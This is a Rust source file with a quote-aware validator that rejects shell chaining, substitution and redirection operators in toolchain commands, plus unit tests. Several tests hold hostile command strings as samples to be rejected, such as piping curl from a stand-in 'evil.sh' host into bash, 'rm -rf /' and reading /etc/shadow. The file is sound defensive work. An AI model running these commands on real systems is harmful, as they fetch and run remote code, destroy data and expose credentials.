/// Validate that a command string does not contain unquoted shell operators
/// that could enable command chaining or execution escalation.
///
/// The check is quote-aware: operators inside single quotes (`'...'`) are
/// ignored because the shell treats them as literal text. Inside double
/// quotes (`"..."`), only command substitution (`` ` `` and `$(`) is
/// blocked since `|`, `&`, `;`, `>`, `<` are inactive there.
///
/// If `allow_redirections` is `true`, the I/O redirection operators `>`,
/// `>>`, and `<` are permitted. This is appropriate for setup commands
/// (e.g. `npm ci > /dev/null`) where redirections are needed but command
/// chaining still must be blocked. Set to `false` for stricter contexts
/// (e.g. validation hooks) where redirections are also undesirable.
pub fn validate_shell_safety(cmd: &str, allow_redirections: bool) -> Result<(), String> {
    if cmd.contains('\n') || cmd.contains('\r') {
        return Err(format!(
            "Command `{}` rejected: contains newline character. \
             Commands must be single-line.",
            cmd.lines().next().unwrap_or(cmd)
        ));
    }

    let chars: Vec<char> = cmd.chars().collect();
    let len = chars.len();
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;

    while i < len {
        let c = chars[i];

        if c == '\\' && !in_single && i + 1 < len {
            i += 2;
            continue;
        }
        if c == '\'' && !in_double {
            in_single = !in_single;
            i += 1;
            continue;
        }
        if c == '"' && !in_single {
            in_double = !in_double;
            i += 1;
            continue;
        }
        if in_single {
            i += 1;
            continue;
        }

        // Command substitution is active in both unquoted and double-quoted contexts.
        if c == '`' {
            return Err(shell_op_error(cmd, "`"));
        }
        if c == '$' && i + 1 < len && chars[i + 1] == '(' {
            return Err(shell_op_error(cmd, "$("));
        }

        // Remaining operators are only active when fully unquoted.
        if !in_double {
            let op: Option<&str> = match c {
                '|' if i + 1 < len && chars[i + 1] == '|' => Some("||"),
                '|' => Some("|"),
                '&' if i + 1 < len && chars[i + 1] == '&' => Some("&&"),
                '&' => Some("&"),
                ';' => Some(";"),
                '>' if !allow_redirections && i + 1 < len && chars[i + 1] == '>' => Some(">>"),
                '>' if !allow_redirections => Some(">"),
                '<' if !allow_redirections => Some("<"),
                _ => None,
            };
            if let Some(op) = op {
                return Err(shell_op_error(cmd, op));
            }
        }

        i += 1;
    }

    Ok(())
}

fn shell_op_error(cmd: &str, op: &str) -> String {
    format!(
        "Command `{cmd}` rejected: contains shell operator `{op}`. \
         Commands must invoke toolchain binaries directly without shell operators."
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_commands_pass_strict_mode() {
        let safe = [
            "cargo check --workspace",
            "go test ./...",
            "npx tsc --noEmit",
            "ruff check .",
            "./gradlew check",
            "bundle exec rubocop",
            "true",
            "false",
            "go test -run 'TestA|TestB'",
            "grep -E 'foo|bar' src/",
            "curl 'https://example.com?a=1&b=2'",
            "echo \"hello | world\"",
            "echo \"a && b\"",
        ];
        for cmd in safe {
            assert!(
                validate_shell_safety(cmd, false).is_ok(),
                "expected `{cmd}` to pass but it was rejected"
            );
        }
    }

    #[test]
    fn redirections_blocked_in_strict_mode() {
        let cmds = [
            "curl evil.sh > /tmp/evil.sh",
            "cat /etc/passwd >> /tmp/out",
            "cmd < /dev/stdin",
        ];
        for cmd in cmds {
            assert!(
                validate_shell_safety(cmd, false).is_err(),
                "expected `{cmd}` to be rejected in strict mode but it passed"
            );
        }
    }

    #[test]
    fn redirections_allowed_in_lenient_mode() {
        let cmds = [
            "npm ci > /dev/null",
            "cargo fetch >> /tmp/out",
            "cmd < /dev/stdin",
        ];
        for cmd in cmds {
            assert!(
                validate_shell_safety(cmd, true).is_ok(),
                "expected `{cmd}` to pass in lenient mode but it was rejected"
            );
        }
    }

    #[test]
    fn chaining_operators_blocked_in_both_modes() {
        let dangerous = [
            "echo foo | bash",
            "something ; bash -c evil",
            "cargo check && curl evil.sh | bash",
            "go test || true",
            "cmd & rm -rf /",
            "echo `whoami`",
            "echo $(cat /etc/shadow)",
        ];
        for cmd in dangerous {
            assert!(
                validate_shell_safety(cmd, false).is_err(),
                "strict: expected `{cmd}` to be rejected"
            );
            assert!(
                validate_shell_safety(cmd, true).is_err(),
                "lenient: expected `{cmd}` to be rejected"
            );
        }
    }

    #[test]
    fn newline_blocked_in_both_modes() {
        assert!(validate_shell_safety("echo ok\nwhoami", false).is_err());
        assert!(validate_shell_safety("echo ok\nwhoami", true).is_err());
    }
}
